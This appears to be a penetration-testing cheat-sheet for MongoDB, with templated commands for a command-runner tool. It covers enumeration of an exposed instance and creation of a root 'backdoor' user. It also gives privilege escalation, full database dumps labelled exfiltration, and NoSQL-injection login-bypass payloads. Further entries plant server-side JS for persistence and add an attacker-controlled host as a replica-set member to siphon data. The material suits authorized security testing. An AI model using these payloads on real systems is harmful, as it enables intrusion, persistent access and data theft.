# MongoDB
> NoSQL document database enumeration, exploitation, and post-exploitation
<!-- tags: mongodb,nosql,database,enumeration -->

---

## scan mongodb nmap nse
Identify MongoDB version and enumerate accessible databases.

```bash
nmap -p 27017 --script mongodb-info,mongodb-databases {{TARGET:ip}}
```

<!-- meta: risk=safe | phase=recon | tags=mongodb,nmap -->

---

## connect mongodb unauthenticated
Test for unauthenticated MongoDB instance access.

```bash
mongo --host {{TARGET:ip}} --port {{PORT:port:27017}}
```

<!-- meta: risk=low | phase=enum | tags=mongodb,unauth,connect -->

---

## connect mongodb authenticated
Authenticate to MongoDB instance with credentials.

```bash
mongo --host {{TARGET:ip}} --port {{PORT:port:27017}} -u {{USERNAME:str}} -p {{PASSWORD:str}} --authenticationDatabase {{DATABASE:str:admin}}
```

<!-- meta: risk=low | phase=enum | tags=mongodb,auth,connect -->

---

## connect mongodb uri string
Connect using MongoDB connection URI.

```bash
mongo mongodb://{{USERNAME:str}}:{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:27017}}/{{DATABASE:str}}
```

<!-- meta: risk=low | phase=enum | tags=mongodb,uri,connect -->

---

## list databases shell
Enumerate all databases on the server from inside mongo shell.

```javascript
show dbs
db.adminCommand("listDatabases")
```

<!-- meta: risk=low | phase=enum | tags=mongodb,databases,list -->

---

## enum users roles
List users and roles in the current/admin database.

```javascript
use admin
db.getUsers()
db.system.users.find().pretty()
db.getRoles({ showBuiltinRoles: true })
```

<!-- meta: risk=low | phase=enum | tags=mongodb,users,roles -->

---

## list collections read data
Show collections in current DB and read documents.

```javascript
show collections
db.{{COLLECTION:str:users}}.find().pretty()
```

<!-- meta: risk=low | phase=enum | tags=mongodb,collections,read -->

---

## whoami current user session
Check authenticated user and privileges in current session.

```javascript
db.runCommand({ connectionStatus: 1 })
db.adminCommand({ usersInfo: 1 })
```

<!-- meta: risk=low | phase=enum | tags=mongodb,whoami,session -->

---

## create backdoor admin user
Create a new user with root role in admin DB (requires privileges).

```javascript
use admin
db.createUser({ user: "{{USERNAME:str:backdoor}}", pwd: "{{PASSWORD:str:Pwn3d!}}", roles: [{ role: "root", db: "admin" }] })
```

<!-- meta: risk=critical | phase=post | tags=mongodb,persistence,backdoor -->

---

## privesc grant root role
Privilege escalation by granting root role to existing user.

```javascript
db.grantRolesToUser("{{USERNAME:str}}", [ { role: "root", db: "admin" } ])
```

<!-- meta: risk=critical | phase=post | tags=mongodb,privesc,role -->

---

## dump full database exfil
Dump entire database to disk for offline analysis.

```bash
mongodump --host {{TARGET:ip}} --port {{PORT:port:27017}} -u {{USERNAME:str}} -p {{PASSWORD:str}} --authenticationDatabase admin --out {{OUTDIR:dir:/tmp/dump}}
```

<!-- meta: risk=high | phase=post | tags=mongodb,dump,exfil -->

---

## export collection json
Export a single collection to JSON file.

```bash
mongoexport --host {{TARGET:ip}} --port {{PORT:port:27017}} -u {{USERNAME:str}} -p {{PASSWORD:str}} --authenticationDatabase admin --db {{DATABASE:str}} --collection {{COLLECTION:str}} --out {{OUTFILE:file:dump.json}}
```

<!-- meta: risk=high | phase=post | tags=mongodb,export,json -->

---

## bypass auth nosqli $ne
Bypass login with $ne operator (always-true match).

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

<!-- meta: risk=high | phase=exploit | tags=nosqli,bypass,auth -->

---

## bypass auth nosqli regex
Bypass authentication using regex match-anything pattern.

```json
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

<!-- meta: risk=high | phase=exploit | tags=nosqli,regex,bypass -->

---

## bypass auth nosqli $or
Use $or to satisfy authentication on any matching condition.

```json
{"$or": [{"username": "admin"}, {"username": {"$exists": true}}]}
```

<!-- meta: risk=high | phase=exploit | tags=nosqli,or,bypass -->

---

## persist server-side js system.js
Store malicious server-side JS function for persistence.

```javascript
db.system.js.save({ _id: "evilFunc", value: function() { return "Malicious"; } })
db.loadServerScripts()
```

<!-- meta: risk=critical | phase=post | tags=mongodb,persistence,system.js -->

---

## pivot replication malicious secondary
Add an attacker-controlled host as replica set secondary to siphon data.

```javascript
rs.conf()
rs.add("{{LHOST:ip}}:27017")
```

<!-- meta: risk=critical | phase=post | tags=mongodb,replication,pivot -->

---

## check mongod process config
Inspect process arguments for --auth and --bind_ip misconfigurations.

```bash
ps aux | grep mongod
```

<!-- meta: risk=safe | phase=enum | tags=mongodb,process,config -->
